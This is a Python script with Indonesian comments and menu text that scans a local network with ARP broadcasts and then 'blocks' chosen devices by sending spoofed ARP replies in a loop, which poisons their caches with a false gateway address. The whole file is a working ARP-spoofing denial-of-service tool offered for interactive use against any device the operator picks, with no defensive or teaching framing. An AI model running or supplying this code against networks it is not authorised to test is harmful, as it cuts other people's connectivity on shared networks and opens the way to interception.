import time
import threading
from scapy.all import ARP, Ether, srp, send

# List untuk menyimpan perangkat yang diblokir
blocked_devices = {}

def scan_network(subnet="192.168.1.0/24"):
    paket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    hasil, _ = srp(paket, timeout=2, verbose=False)

    devices = []
    for _, received in hasil:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})

    return devices

def show_devices():
    devices = scan_network()
    print("\nPerangkat yang terdeteksi:")
    print("-" * 50)
    for i, device in enumerate(devices, start=1):
        print(f"{i}. IP: {device['ip']} - MAC: {device['mac']}")
    print("-" * 50)

def block_mac(target_ip, gateway_ip):
    print(f"🚫 Memutuskan koneksi perangkat {target_ip}...")
    
    paket = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)

    def send_packets():
        while target_ip in blocked_devices:
            send(paket, verbose=False)
            time.sleep(2)

    blocked_devices[target_ip] = threading.Thread(target=send_packets)
    blocked_devices[target_ip].start()

def unblock_mac(target_ip):
    if target_ip in blocked_devices:
        print(f"✅ Membuka blokir perangkat {target_ip}")
        del blocked_devices[target_ip]
    else:
        print(f"⚠️ Perangkat {target_ip} tidak dalam daftar blokir")

def menu():
    while True:
        print("\n===== MENU =====")
        print("1. Scan Jaringan")
        print("2. Blokir Perangkat")
        print("3. Buka Blokir Perangkat")
        print("4. Keluar")
        
        pilihan = input("Pilih opsi: ")

        if pilihan == "1":
            show_devices()
        elif pilihan == "2":
            target_ip = input("Masukkan IP perangkat yang ingin diblokir: ")
            gateway_ip = input("Masukkan IP router (default: 192.168.1.1): ") or "192.168.1.1"
            block_mac(target_ip, gateway_ip)
        elif pilihan == "3":
            target_ip = input("Masukkan IP perangkat yang ingin dibuka blokirnya: ")
            unblock_mac(target_ip)
        elif pilihan == "4":
            print("Keluar dari program.")
            break
        else:
            print("⚠️ Pilihan tidak valid!")

if __name__ == "__main__":
    menu()
